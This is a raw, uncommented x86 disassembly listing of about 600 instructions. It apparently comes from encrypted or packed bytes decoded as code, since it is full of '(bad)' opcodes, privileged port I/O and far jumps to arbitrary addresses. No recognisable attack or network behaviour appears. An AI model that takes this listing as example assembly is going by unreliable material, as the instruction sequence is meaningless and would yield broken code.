  40f96b:	pusha  
  40f96c:	mov    al,0xc
  40f96e:	lods   eax,DWORD PTR ds:[esi]
  40f96f:	inc    ebx
  40f970:	fisubr DWORD PTR [ebx-0x63]
  40f973:	add    DWORD PTR [ebx+0x2f],edi
  40f976:	sbb    al,0x8
  40f978:	(bad)  
  40f979:	xor    DWORD PTR [ecx+0x0],esi
  40f97c:	mov    ebx,0x5212c79d
  40f981:	mov    ebp,0x1c3702a6
  40f986:	push   edi
  40f987:	stc    
  40f988:	xchg   ebp,eax
  40f989:	(bad)  
  40f98a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f98b:	pop    ecx
  40f98c:	call   0xfa420fef
  40f991:	js     0x40f963
  40f993:	pop    ebx
  40f994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f995:	xlat   BYTE PTR ds:[ebx]
  40f996:	and    edi,DWORD PTR [edi]
  40f998:	lods   al,BYTE PTR ds:[esi]
  40f999:	sbb    BYTE PTR [edx-0x6a],0x7b
  40f99d:	ret    
  40f99e:	ins    BYTE PTR es:[edi],dx
  40f99f:	lods   eax,DWORD PTR ds:[esi]
  40f9a0:	fisub  DWORD PTR [ebp-0x1d]
  40f9a3:	dec    edx
  40f9a4:	fs rcl esp,1
  40f9a7:	outs   dx,BYTE PTR ds:[esi]
  40f9a8:	inc    edx
  40f9a9:	xor    edx,DWORD PTR [ebx+0x3b29caac]
  40f9af:	sbb    al,0x65
  40f9b1:	imul   BYTE PTR [ebp+0x13]
  40f9b4:	imul   eax,DWORD PTR [ebx],0xfffffff3
  40f9b7:	jmp    0xbd92f03e
  40f9bc:	fisttp WORD PTR [edx]
  40f9be:	push   esi
  40f9bf:	in     eax,dx
  40f9c0:	mov    dl,0xfd
  40f9c2:	adc    al,0x55
  40f9c4:	stc    
  40f9c5:	pop    ecx
  40f9c6:	shl    edx,cl
  40f9c8:	pushf  
  40f9c9:	dec    esi
  40f9ca:	ss pop esi
  40f9cc:	push   esi
  40f9cd:	pop    eax
  40f9ce:	push   ds
  40f9cf:	jb     0x40f9cc
  40f9d1:	bound  esp,QWORD PTR [ebx+eiz*2]
  40f9d4:	jmp    FWORD PTR [edx+0x5a]
  40f9d7:	outs   dx,BYTE PTR ds:[esi]
  40f9d8:	mov    esi,DWORD PTR [esi-0xac0229a]
  40f9de:	(bad)  
  40f9df:	(bad)  
  40f9e0:	dec    ebp
  40f9e1:	lods   al,BYTE PTR ds:[esi]
  40f9e2:	add    DWORD PTR [ebx+0x5a09e659],edx
  40f9e8:	jecxz  0x40f9f8
  40f9ea:	inc    edi
  40f9eb:	enter  0xc95a,0x19
  40f9ef:	bound  esp,QWORD PTR [edx-0x27]
  40f9f2:	adc    cl,0x3e
  40f9f5:	es xor edx,0xcc6bf1f9
  40f9fc:	jmp    0x949b0631
  40fa01:	loopne 0x40f9d5
  40fa03:	lds    ebp,FWORD PTR [edi-0x72d89eba]
  40fa09:	inc    ebx
  40fa0a:	xchg   esi,eax
  40fa0b:	scas   eax,DWORD PTR es:[edi]
  40fa0c:	xor    al,0x54
  40fa0e:	fwait
  40fa0f:	clc    
  40fa10:	vpackuswb ymm1,ymm4,YMMWORD PTR [ecx+0x389cde94]
  40fa18:	dec    ecx
  40fa19:	jae    0x40f9a2
  40fa1b:	pusha  
  40fa1c:	fld    QWORD PTR [edi+ebx*1+0x74]
  40fa20:	jl     0x40f9ac
  40fa22:	enter  0xae83,0x44
  40fa26:	inc    ebx
  40fa27:	pusha  
  40fa28:	sbb    eax,0x8add28ef
  40fa2d:	push   eax
  40fa2e:	je     0x40fa83
  40fa30:	call   0x28e78702
  40fa35:	xchg   ecx,eax
  40fa36:	push   edi
  40fa37:	out    dx,al
  40fa38:	pop    ebp
  40fa39:	ins    DWORD PTR es:[edi],dx
  40fa3a:	ror    BYTE PTR [ebx+0x16],1
  40fa3d:	pop    edi
  40fa3e:	repz dec esi
  40fa40:	popf   
  40fa41:	out    dx,eax
  40fa42:	test   BYTE PTR [esi],ch
  40fa44:	mov    eax,0x8d1e71a0
  40fa49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa4a:	sub    dl,BYTE PTR [eax+0x41acd7b4]
  40fa50:	in     eax,dx
  40fa51:	pop    edx
  40fa52:	loope  0x40fab3
  40fa54:	bswap  ebx
  40fa56:	in     al,dx
  40fa57:	mov    WORD PTR [edx+eax*8],es
  40fa5a:	mov    ebp,ecx
  40fa5c:	in     al,0x79
  40fa5e:	jmp    0x40fa52
  40fa60:	jb     0x40f9ed
  40fa62:	or     cl,BYTE PTR [edi+0x27246ea9]
  40fa68:	push   edi
  40fa69:	(bad)  
  40fa6b:	cmp    cl,al
  40fa6d:	xchg   esi,eax
  40fa6e:	xor    eax,0xd6a2cc1d
  40fa73:	mov    ecx,0xfe963a78
  40fa78:	jp     0x40fa96
  40fa7a:	mov    esi,0xaa8264a6
  40fa7f:	adc    al,0x14
  40fa81:	adc    ebp,DWORD PTR [edi-0x54]
  40fa84:	or     al,0xf0
  40fa86:	fdivr  st,st(6)
  40fa88:	mov    esi,0x486f083e
  40fa8d:	test   BYTE PTR [ecx+0x5ab618ef],dh
  40fa93:	pop    esi
  40fa94:	jle    0x40faf2
  40fa96:	xchg   eax,esp
  40fa98:	fld    DWORD PTR [ecx+eiz*4]
  40fa9b:	mov    ebx,0x51f2bc27
  40faa0:	jbe    0x40fa2d
  40faa2:	cs (bad) 
  40faa4:	mov    ah,0xf
  40faa6:	jbe    0x40fa2c
  40faa8:	fcomp  DWORD PTR [edi]
  40faaa:	outs   dx,BYTE PTR ds:[esi]
  40faab:	ror    DWORD PTR [ecx+0x844b60],1
  40fab1:	jge    0x40faa9
  40fab3:	scas   eax,DWORD PTR es:[edi]
  40fab4:	mov    eax,0xca5a67ab
  40fab9:	inc    eax
  40faba:	push   edi
  40fabb:	retf   
  40fabc:	pop    edx
  40fabd:	xor    eax,0x13ef98c6
  40fac2:	jo     0x40fb34
  40fac4:	push   es
  40fac5:	mov    esi,0xfaafa5e2
  40faca:	mov    bh,0xcb
  40facc:	in     eax,0x6c
  40face:	mov    ?,ebp
  40fad0:	test   DWORD PTR [esi+ebx*4],edx
  40fad3:	pop    eax
  40fad4:	fldcw  WORD PTR [edx+0x21]
  40fad7:	call   0x7b1a:0x97c576b8
  40fade:	jo     0x40facd
  40fae0:	xchg   ecx,eax
  40fae1:	inc    edi
  40fae2:	cmp    DWORD PTR [edx-0x3f],esp
  40fae5:	push   ss
  40fae6:	outs   dx,BYTE PTR ds:[esi]
  40fae7:	retf   
  40fae8:	jp     0x40fb63
  40faea:	cmp    ebp,esi
  40faec:	daa    
  40faed:	test   eax,0x83c5f6e3
  40faf2:	enter  0xc87,0x7d
  40faf6:	out    0xbd,al
  40faf8:	(bad)  [ebx]
  40fafa:	mov    dh,0x81
  40fafc:	adc    cl,bh
  40fafe:	lahf   
  40faff:	jle    0x40fb17
  40fb01:	loop   0x40faea
  40fb03:	icebp  
  40fb04:	lea    ecx,[ebp-0x644c4264]
  40fb0a:	shl    bh,0xd1
  40fb0d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40fb0f:	pop    ebx
  40fb10:	jo     0x40fb11
  40fb12:	or     al,BYTE PTR [edi]
  40fb14:	popa   
  40fb15:	xor    eax,0x4618ae65
  40fb1a:	mov    al,ds:0x9e4da084
  40fb1f:	add    eax,0x92110d9c
  40fb24:	cmp    ecx,ebp
  40fb26:	icebp  
  40fb27:	jb     0x40fb6c
  40fb29:	mov    ecx,0xcb78b92b
  40fb2e:	cmp    DWORD PTR [edx+edi*8+0x18],ecx
  40fb32:	retf   
  40fb33:	push   ebp
  40fb34:	and    bl,BYTE PTR [ebp+0x71f84f1b]
  40fb3a:	rcl    DWORD PTR [edx-0x268c9b2c],1
  40fb40:	stc    
  40fb41:	mov    esp,0x183dfeaa
  40fb46:	sub    dh,bh
  40fb48:	fsub   QWORD PTR [eax-0x7]
  40fb4b:	(bad)  
  40fb4c:	faddp  st(2),st
  40fb4e:	hlt    
  40fb4f:	or     al,0x70
  40fb51:	sbb    al,0xaa
  40fb53:	or     ebx,DWORD PTR [ecx]
  40fb55:	sbb    bl,BYTE PTR [eax+0x39]
  40fb58:	sub    al,0xef
  40fb5a:	aas    
  40fb5b:	jmp    0x40fb75
  40fb5d:	fchs   
  40fb5f:	bound  ebp,QWORD PTR [ecx]
  40fb61:	test   al,0xab
  40fb63:	xchg   DWORD PTR [eax],esi
  40fb65:	jmp    FWORD PTR [edx]
  40fb67:	fmul   QWORD PTR [eax-0x44a1d58a]
  40fb6d:	fst    DWORD PTR [ebx+0x718970b7]
  40fb73:	push   eax
  40fb74:	sub    esi,ebp
  40fb76:	dec    esp
  40fb77:	xor    eax,0xc3d19fad
  40fb7c:	sbb    DWORD PTR [eax],0xfd9c9d25
  40fb82:	pop    ds
  40fb83:	shl    DWORD PTR [edi-0x5cf86680],0x79
  40fb8a:	mov    cs,WORD PTR [edi]
  40fb8c:	jns    0x40fbd6
  40fb8e:	push   ebx
  40fb8f:	call   0xdf23c12a
  40fb94:	js     0x40fbf1
  40fb96:	sar    BYTE PTR [edi-0x31],cl
  40fb99:	mov    edx,DWORD PTR [edx-0x39]
  40fb9c:	push   ds
  40fb9d:	adc    dh,BYTE PTR [eax]
  40fb9f:	xchg   ebp,eax
  40fba0:	cmc    
  40fba1:	mov    eax,ds:0x139a511c
  40fba6:	push   ecx
  40fba7:	pushf  
  40fba8:	jmp    0xd53f02e3
  40fbad:	or     dl,cl
  40fbaf:	mov    bl,0x74
  40fbb1:	inc    edx
  40fbb2:	push   ebp
  40fbb3:	xchg   edi,eax
  40fbb4:	repnz adc BYTE PTR [ecx],dh
  40fbb7:	jmp    0xf1c2c47d
  40fbbc:	ja     0x40fbdd
  40fbbe:	stos   BYTE PTR es:[edi],al
  40fbbf:	addr16 mov ebx,cs
  40fbc2:	int3   
  40fbc3:	pop    ds
  40fbc4:	ss inc ebx
  40fbc6:	in     al,0x10
  40fbc8:	js     0x40fb6d
  40fbca:	cmp    eax,ebx
  40fbcc:	xchg   BYTE PTR [ebp+eiz*2+0x1b],dh
  40fbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbd1:	hlt    
  40fbd2:	xlat   BYTE PTR ds:[ebx]
  40fbd3:	fild   DWORD PTR [eax]
  40fbd5:	inc    edx
  40fbd6:	cli    
  40fbd7:	xchg   ebx,eax
  40fbd8:	add    eax,0xd11828e5
  40fbdd:	hlt    
  40fbde:	std    
  40fbdf:	xchg   ebp,eax
  40fbe0:	and    eax,0x3ac60214
  40fbe5:	scas   al,BYTE PTR es:[edi]
  40fbe6:	or     esi,eax
  40fbe8:	outs   dx,BYTE PTR ds:[esi]
  40fbe9:	fadd   DWORD PTR [edi+0x5a]
  40fbec:	add    eax,0x3810405c
  40fbf1:	lods   al,BYTE PTR ds:[esi]
  40fbf2:	call   DWORD PTR [ecx+0x23ce449d]
  40fbf8:	lock or ebx,DWORD PTR [esi-0x2fca5b54]
  40fbff:	mov    BYTE PTR [esi-0x4dae0aeb],bl
  40fc05:	xchg   esp,eax
  40fc06:	or     esi,DWORD PTR [ebx+0xc]
  40fc09:	ja     0x40fc19
  40fc0b:	pop    edi
  40fc0c:	std    
  40fc0d:	aaa    
  40fc0e:	inc    ebx
  40fc0f:	sub    al,0xeb
  40fc11:	fadd   st,st(7)
  40fc13:	xor    al,0xfe
  40fc15:	push   ebp
  40fc16:	scas   eax,DWORD PTR es:[edi]
  40fc17:	enter  0xdc31,0xc6
  40fc1b:	or     al,0x33
  40fc1d:	cmp    BYTE PTR [ecx],0xe1
  40fc20:	mov    ds:0xedd7c678,eax
  40fc25:	ja     0x40fbf2
  40fc27:	jbe    0x40fba9
  40fc29:	xor    BYTE PTR [eax],bl
  40fc2b:	push   ecx
  40fc2c:	cmp    BYTE PTR [eax-0x5d772fbb],0xc0
  40fc33:	jge    0x40fc8e
  40fc35:	enter  0xc092,0x3e
  40fc39:	jg     0x40fbdf
  40fc3b:	sub    esp,DWORD PTR [edx-0x1798f78c]
  40fc41:	pop    eax
  40fc42:	jo     0x40fcb1
  40fc44:	gs push edx
  40fc46:	sti    
  40fc47:	or     eax,0xd75f866
  40fc4c:	cwde   
  40fc4d:	xor    al,BYTE PTR [edx-0x29a35f7c]
  40fc53:	xchg   esi,edi
  40fc55:	stos   BYTE PTR es:[di],al
  40fc57:	and    al,0xd5
  40fc59:	mov    esi,0x5eca84f0
  40fc5e:	push   es
  40fc5f:	push   edx
  40fc60:	fld    TBYTE PTR [eax+eax*1-0x52d34af7]
  40fc67:	sub    eax,0x8bd4cfb
  40fc6c:	fwait
  40fc6d:	mov    al,0x4b
  40fc6f:	add    al,0xe4
  40fc71:	loop   0x40fc07
  40fc73:	add    BYTE PTR [ecx+0x7b],0x46
  40fc77:	sub    bl,dh
  40fc79:	xchg   edx,eax
  40fc7a:	and    DWORD PTR [esi-0x4e1f01d8],eax
  40fc80:	fiadd  WORD PTR [edi+0x73]
  40fc83:	mov    cl,0x9d
  40fc85:	ja     0x40fccb
  40fc87:	and    ecx,DWORD PTR [ecx+eiz*1+0x443f82e4]
  40fc8e:	adc    eax,0xae9d2cd2
  40fc93:	sbb    BYTE PTR [ecx],al
  40fc95:	gs es ret 
  40fc98:	dec    esi
  40fc99:	and    ch,dh
  40fc9b:	ins    DWORD PTR es:[edi],dx
  40fc9c:	fwait
  40fc9d:	xlat   BYTE PTR ds:[ebx]
  40fc9e:	test   eax,0x8c8c4b52
  40fca3:	xchg   BYTE PTR [ebx+0x38d260d1],al
  40fca9:	mov    ds:0xece601b4,al
  40fcae:	punpckhwd mm6,QWORD PTR [esi-0x6154a2bd]
  40fcb5:	int3   
  40fcb6:	adc    eax,0xa3923a4d
  40fcbb:	test   eax,0x29154325
  40fcc0:	in     eax,dx
  40fcc1:	int    0x3f
  40fcc3:	lods   eax,DWORD PTR ds:[esi]
  40fcc4:	push   ebp
  40fcc5:	fcomp  QWORD PTR [ebp-0x1e]
  40fcc8:	xor    DWORD PTR [edi],edx
  40fcca:	push   ebx
  40fccb:	stos   BYTE PTR es:[edi],al
  40fccc:	pmaxub mm0,mm6
  40fccf:	cmp    edi,esi
  40fcd1:	mov    ah,0x28
  40fcd3:	repz arpl WORD PTR [edx+0x2799dfe9],cx
  40fcda:	pop    ebx
  40fcdb:	jnp    0x40fc85
  40fcdd:	in     eax,0xb3
  40fcdf:	mov    ds:0x8eec5ca,eax
  40fce4:	xchg   DWORD PTR [edi+edi*4-0x66fc3709],edx
  40fceb:	repz or cl,bh
  40fcee:	lds    esi,FWORD PTR [edi+0x1d]
  40fcf1:	sbb    eax,0xf53fad54
  40fcf6:	js     0x40fcbc
  40fcf8:	(bad)  
  40fcf9:	leave  
  40fcfa:	clc    
  40fcfb:	xlat   BYTE PTR ds:[ebx]
  40fcfc:	pop    es
  40fcfd:	pop    ebp
  40fcfe:	mov    dl,0x23
  40fd00:	pop    ds
  40fd01:	sub    eax,0x8749f44f
  40fd06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd07:	adc    eax,0x446ce6d7
  40fd0c:	mov    al,0xc9
  40fd0e:	dec    edx
  40fd0f:	pop    ebp
  40fd10:	div    DWORD PTR [ebx]
  40fd12:	aad    0x3f
  40fd14:	push   edx
  40fd15:	(bad)  
  40fd17:	rcr    DWORD PTR [ebp-0x3b],0x8d
  40fd1b:	stc    
  40fd1c:	rcl    DWORD PTR [eax+eax*8-0x1c],cl
  40fd20:	scas   eax,DWORD PTR es:[edi]
  40fd21:	mov    edi,0xa0737b07
  40fd26:	imul   esi,DWORD PTR [ebx+ebp*8+0x199f2d74],0x1db8da1c
  40fd31:	and    al,dh
  40fd33:	xchg   ebp,eax
  40fd34:	sti    
  40fd35:	aas    
  40fd36:	inc    ecx
  40fd37:	sahf   
  40fd38:	in     al,0x23
  40fd3a:	in     al,0x31
  40fd3c:	into   
  40fd3d:	and    eax,0xf523c4f3
  40fd42:	add    dl,BYTE PTR [ebx]
  40fd44:	cmc    
  40fd45:	sub    eax,0xf243163e
  40fd4a:	jns    0x40fdb3
  40fd4c:	fsubr  QWORD PTR [eax+0x18e940b9]
  40fd52:	and    DWORD PTR ds:0x8251a27f,ecx
  40fd58:	dec    edx
  40fd59:	(bad)  
  40fd5a:	scas   eax,DWORD PTR es:[edi]
  40fd5b:	xor    al,0x21
  40fd5d:	loop   0x40fd8d
  40fd5f:	repnz push ebx
  40fd61:	inc    ecx
  40fd62:	push   cs
  40fd63:	jne    0x40fdd6
  40fd65:	lods   al,BYTE PTR ds:[esi]
  40fd66:	ja     0x40fddc
  40fd68:	jl     0x40fd07
  40fd6a:	ins    BYTE PTR es:[edi],dx
  40fd6b:	sub    al,0x5f
  40fd6d:	jae    0x40fd98
  40fd6f:	adc    eax,0x30709ba2
  40fd74:	lds    esi,FWORD PTR [edx]
  40fd76:	push   esp
  40fd78:	fcmovnb st,st(4)
  40fd7a:	xor    dh,dl
  40fd7c:	ins    BYTE PTR es:[edi],dx
  40fd7d:	jns    0x40fd01
  40fd7f:	xchg   edi,eax
  40fd80:	jecxz  0x40fd0c
  40fd82:	adc    BYTE PTR [ebp+0x388114f2],dl
  40fd88:	add    bl,0x4e
  40fd8b:	and    edi,DWORD PTR [ebp+0x71a913e2]
  40fd91:	fidiv  WORD PTR [esi]
  40fd93:	(bad)  
  40fd94:	jno    0x40fd4f
  40fd96:	inc    edx
  40fd97:	xchg   esi,eax
  40fd98:	jg     0x40fd38
  40fd9a:	mov    ch,0x6a
  40fd9c:	ficomp WORD PTR [eax]
  40fd9e:	push   0x2472e74f
  40fda3:	xchg   ecx,eax
  40fda4:	mov    eax,ds:0x49e12b5c
  40fda9:	test   ebp,esi
  40fdab:	das    
  40fdac:	jle    0x40fd88
  40fdae:	mov    edx,0xbaadd213
  40fdb3:	xchg   ebx,eax
  40fdb4:	dec    ecx
  40fdb5:	outs   dx,DWORD PTR fs:[esi]
  40fdb7:	fisttp DWORD PTR [edx-0x5b]
  40fdba:	mov    ch,0xda
  40fdbc:	mov    esi,0xb269ab93
  40fdc1:	retf   0x4d1a
  40fdc4:	sub    al,0xb0
  40fdc6:	popf   
  40fdc7:	mov    eax,ds:0x46a19d14
  40fdcc:	gs mov al,0xf7
  40fdcf:	xor    DWORD PTR [eax+0x3087ce14],edi
  40fdd5:	pop    esi
  40fdd6:	aam    0x6c
  40fdd8:	jecxz  0x40fd89
  40fdda:	push   ss
  40fddb:	sbb    eax,0x4ec9cf14
  40fde0:	xchg   edx,eax
  40fde1:	adc    al,bl
  40fde3:	cdq    
  40fde4:	mov    bh,BYTE PTR [ecx-0x7f]
  40fde7:	add    edi,ecx
  40fde9:	dec    ebx
  40fdea:	jno    0x40fd9b
  40fdec:	(bad)  
  40fded:	in     eax,0x35
  40fdef:	add    al,0x63
  40fdf1:	pop    esi
  40fdf2:	xchg   edi,eax
  40fdf3:	scas   eax,DWORD PTR es:[edi]
  40fdf4:	adc    al,BYTE PTR [ebx-0x25]
  40fdf7:	push   0xa4e9c830
  40fdfc:	jne    0x40fe6d
  40fdfe:	inc    ecx
  40fdff:	enter  0xdb1f,0x5f
  40fe03:	lods   al,BYTE PTR ds:[esi]
  40fe04:	cwde   
  40fe05:	pop    edx
  40fe06:	cmp    eax,0xbac6a714
  40fe0b:	mov    dl,0x89
  40fe0d:	jl     0x40fe85
  40fe0f:	push   esi
  40fe10:	out    dx,eax
  40fe11:	call   0x163053ea
  40fe16:	call   0xe29:0x61a83af6
  40fe1d:	cmp    dl,BYTE PTR [ebx+edx*2-0x46]
  40fe21:	xor    cl,BYTE PTR [eax-0x1f]
  40fe24:	cs jae 0x40fe08
  40fe27:	cmp    BYTE PTR [ebp-0x17d9f8f2],dl
  40fe2d:	or     edi,DWORD PTR [edi-0x12]
  40fe30:	adc    al,0x81
  40fe32:	xchg   ebp,eax
  40fe33:	stc    
  40fe34:	xlat   BYTE PTR ds:[ebx]
  40fe35:	in     eax,dx
  40fe36:	push   ss
  40fe37:	scas   al,BYTE PTR es:[edi]
  40fe38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe39:	cwde   
  40fe3a:	xlat   BYTE PTR ds:[ebx]
  40fe3b:	push   edx
  40fe3c:	pusha  
  40fe3d:	into   
  40fe3e:	cmp    ch,cl
  40fe40:	mov    eax,?
  40fe42:	arpl   WORD PTR [esi+0x4a029a1a],cx
  40fe48:	sub    eax,0x5003b5a3
  40fe4d:	out    dx,eax
  40fe4e:	outs   dx,BYTE PTR ds:[esi]
  40fe4f:	in     al,0xed
  40fe51:	sbb    DWORD PTR [ecx+ebp*8+0x3218731e],esp
  40fe58:	mov    dh,0x71
  40fe5a:	(bad)  
  40fe5b:	sub    edi,DWORD PTR [edi-0x2ec1b83b]
  40fe61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe62:	xor    eax,0x8c5a41ef
  40fe67:	cs jae 0x40fe6e
  40fe6a:	arpl   WORD PTR [ebx],sp
  40fe6c:	or     edx,ecx
  40fe6e:	les    esp,FWORD PTR [ecx-0x438c3d50]
  40fe74:	les    esp,FWORD PTR [edi-0xd]
  40fe77:	test   al,0xe1
  40fe79:	cld    
  40fe7a:	cwde   
  40fe7b:	add    eax,edi
  40fe7d:	fldcw  WORD PTR [esi*2-0x3d6b52b3]
  40fe84:	ja     0x40fe90
  40fe86:	push   ss
  40fe87:	pop    ecx
  40fe88:	enter  0xa9b6,0xdf
  40fe8c:	stos   BYTE PTR es:[edi],al
  40fe8d:	jl     0x40fed8
  40fe8f:	sbb    DWORD PTR [eax+ecx*2],eax
  40fe92:	mov    bl,0x11
  40fe94:	mov    eax,0x2918966c
  40fe99:	aad    0x63
  40fe9b:	mul    BYTE PTR [edi]
  40fe9d:	iret   
  40fe9e:	pushf  
  40fe9f:	and    eax,0x25c5d255
  40fea4:	scas   al,BYTE PTR es:[edi]
  40fea5:	add    al,0xc4
  40fea7:	aaa    
  40fea8:	lahf   
  40fea9:	push   ds
  40feaa:	mov    edi,0x7576a6a6
  40feaf:	setne  BYTE PTR [eax-0x59]
  40feb3:	mov    ah,BYTE PTR [ebp-0x33]
  40feb6:	out    dx,eax
  40feb7:	mov    al,ds:0xcf28618f
  40febc:	jb     0x40fef5
  40febe:	das    
  40febf:	int    0x63
  40fec1:	cdq    
  40fec2:	mov    ebx,0x5429456e
  40fec7:	inc    edi
  40fec8:	in     al,0xc7
  40feca:	inc    edi
  40fecb:	(bad)  
  40fecc:	hlt    
  40fecd:	cmp    dh,dl
  40fecf:	inc    esi
  40fed0:	icebp  
  40fed1:	sbb    BYTE PTR [ebx+eax*2+0xc1c08dd],al
  40fed8:	pop    es
  40fed9:	call   0xa544:0xdf7672f6
  40fee0:	imul   ebx,DWORD PTR [ebx+eax*1+0x40],0x77df0475
  40fee8:	xchg   BYTE PTR [esi+0x7f],bh
  40feeb:	mov    cl,0xbb
  40feed:	ja     0x40ff3d
  40feef:	sub    al,0xdf
  40fef1:	lods   eax,DWORD PTR ds:[esi]
  40fef2:	xor    bh,bl
  40fef4:	dec    edi
  40fef5:	dec    ebp
  40fef6:	enter  0x1593,0xd8
  40fefa:	or     eax,0x6c72baf8
  40feff:	inc    esi
  40ff00:	jg     0x40ff43
  40ff02:	rol    BYTE PTR [esi+0x7d1120c9],0xaf
  40ff09:	and    cl,BYTE PTR [ebp+0x787e5c39]
  40ff0f:	and    edi,DWORD PTR [ebx]
  40ff11:	jecxz  0x40fee7
  40ff13:	cmc    
  40ff14:	loope  0x40ff4b
  40ff16:	iret   
  40ff17:	ds and eax,0xf01b4b12
  40ff1d:	or     dh,BYTE PTR [edi]
  40ff1f:	sti    
  40ff20:	bound  edi,QWORD PTR [ebx-0x24fab36f]
  40ff26:	dec    ebx
  40ff27:	add    al,0xf6
  40ff29:	out    dx,eax
  40ff2a:	hlt    
  40ff2b:	lahf   
  40ff2c:	sbb    BYTE PTR [edx-0x44],bl
  40ff2f:	iret   
  40ff30:	cmp    edi,edi
  40ff32:	icebp  
  40ff33:	adc    eax,0xe59ecf8f
  40ff38:	and    ah,ah
  40ff3a:	jecxz  0x40ff4f
  40ff3c:	outs   dx,DWORD PTR ds:[esi]
  40ff3d:	xor    al,0x8
  40ff3f:	mov    al,0x1a
  40ff41:	loopne 0x40ff5b
  40ff43:	mov    bl,0x34
  40ff45:	ds std 
  40ff47:	dec    esi
  40ff48:	test   BYTE PTR [esi+0x2ff9a18e],ch
  40ff4e:	inc    edx
  40ff4f:	ret    0xd16d
  40ff52:	mov    edi,0x76f746d
  40ff57:	cmp    dl,BYTE PTR [esi]
  40ff59:	push   edx
  40ff5a:	stc    
  40ff5b:	mov    esp,0x2ec45c04
  40ff60:	sbb    bh,BYTE PTR [edx]
  40ff62:	cmp    al,0x82
  40ff64:	sub    ecx,DWORD PTR [edx+0x4e2b31]
  40ff6a:	push   es
  40ff6b:	jmp    0x28ea:0xac8d6297
  40ff72:	ret    
  40ff73:	xor    edi,DWORD PTR [esi]
  40ff75:	call   0xe239acaf
  40ff7a:	xchg   edi,eax
  40ff7b:	mov    ds:0x5af5c368,al
  40ff80:	mov    ?,WORD PTR [eax+0x34a93e83]
  40ff86:	push   ecx
  40ff87:	jg     0x40ff49
  40ff89:	in     eax,0x47
  40ff8b:	cmp    cl,BYTE PTR [ebx-0x2d03e0db]
  40ff91:	add    DWORD PTR [edi-0x5a],0x519ab9aa
  40ff98:	jne    0x40ff76
  40ff9a:	ret    0xf4c1
  40ff9d:	mov    DWORD PTR [esi+0x563f69b5],edx
  40ffa3:	cs adc eax,eax
  40ffa6:	pusha  
  40ffa7:	mov    esp,0x40c0a859
  40ffac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffad:	test   DWORD PTR [eax],eax
  40ffaf:	icebp  
  40ffb0:	aad    0x66
  40ffb2:	xlat   BYTE PTR ds:[ebx]
  40ffb3:	test   eax,0xb17e8b5e
  40ffb8:	mov    ss,WORD PTR [ecx]
  40ffba:	pop    ebx
  40ffbb:	mov    ch,0x1a
  40ffbd:	adc    DWORD PTR [ebx+eiz*8-0x10],edx
  40ffc1:	into   
  40ffc2:	and    ch,BYTE PTR [esi-0x607b8656]
  40ffc8:	xchg   esp,eax
  40ffc9:	and    al,0x2a
  40ffcb:	fcmovnb st,st(6)
  40ffcd:	or     DWORD PTR [ebx+eax*4-0x62],edx
  40ffd1:	int3   
  40ffd2:	xchg   DWORD PTR ds:0x1331c3e,ebp
  40ffd8:	lea    edi,[edx]
  40ffda:	and    ebx,DWORD PTR [ebx+edi*4-0x3450e60f]
  40ffe1:	idiv   DWORD PTR [eiz*8-0x7edc4ab]
  40ffe8:	mov    ebx,0xb532e744
  40ffed:	ins    BYTE PTR es:[edi],dx
  40ffee:	jecxz  0x41000b
  40fff0:	retf   
  40fff1:	call   0xadab:0x6a2780c3
  40fff8:	lods   eax,DWORD PTR ds:[esi]
  40fff9:	sbb    al,0x8a
  40fffb:	lods   al,BYTE PTR ds:[esi]
  40fffc:	cmc    
  40fffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fffe:	xchg   ebx,eax
  40ffff:	xor    esi,ecx
  410001:	pop    esp
  410002:	inc    ebp
  410003:	or     ebx,esp
  410005:	hlt    
  410006:	pop    ss
  410007:	and    BYTE PTR [edi+eax*1+0x5b],0x5e
  41000c:	mov    dl,0x9f
  41000e:	inc    ebp
  41000f:	popf   
  410010:	es test al,0x1d
  410013:	icebp  
  410014:	fbld   TBYTE PTR [edi]
  410016:	loop   0x41001f
  410018:	ror    DWORD PTR [ebx+0x6952eb7],0x9
  41001f:	test   DWORD PTR [esi+ebp*4-0x5f4ad819],esp
  410026:	sbb    BYTE PTR [ebx+0x4b],dl
  410029:	stc    
  41002a:	(bad)  
  41002b:	ins    BYTE PTR es:[edi],dx
  41002c:	adc    DWORD PTR [ebx],esp
  41002e:	rcl    BYTE PTR [edi],cl
  410030:	mov    esi,0xf09d133e
  410035:	sub    al,0x42
  410037:	cs sbb edx,eax
  41003a:	or     al,0xf8
  41003c:	aam    0xa4
  41003e:	das    
  41003f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410040:	scas   al,BYTE PTR es:[edi]
  410041:	sar    BYTE PTR [ebp+0x18],0x5a
  410045:	pop    edx
  410046:	pop    eax
  410047:	cmp    eax,DWORD PTR [eax+0x36f7aab1]
  41004d:	and    BYTE PTR [esi],cl
  41004f:	in     al,0xf
  410051:	sub    eax,0x698c546e
  410056:	das    
  410057:	lods   eax,DWORD PTR ds:[esi]
  410058:	or     ebx,DWORD PTR [esi+0x3be79c6c]
  41005e:	loop   0x40ffe7
  410060:	shl    DWORD PTR [ecx],cl
  410062:	call   0x475a1a
  410067:	mov    esi,esp
  410069:	lea    ebx,[ebx+0x9698dff]
  41006f:	call   0x9e6a:0x48f2fee2
  410076:	mov    esi,0x8818c835
  41007b:	(bad)  
  41007c:	cmp    eax,0x67e55274
  410081:	mov    ss,WORD PTR [eax-0x65bd1f4b]
  410087:	push   ecx
  410088:	jmp    0xfafe:0xe57872f2
  41008f:	dec    ecx
  410090:	xrelease xchg BYTE PTR [ecx-0x3e],ah
  410094:	inc    esp
  410095:	aam    0x8f
  410097:	aas    
  410098:	out    dx,eax
  410099:	test   DWORD PTR [ecx+0x78],eax
  41009c:	hlt    
  41009d:	or     esi,ecx
  41009f:	out    0x60,al
  4100a1:	test   al,0xd7
  4100a3:	add    DWORD PTR [eax],esi
  4100a5:	jno    0x41006d
  4100a7:	push   edi
  4100a8:	jnp    0x41005b
  4100aa:	add    BYTE PTR [ebx],0x6f
  4100ad:	rcl    edi,1
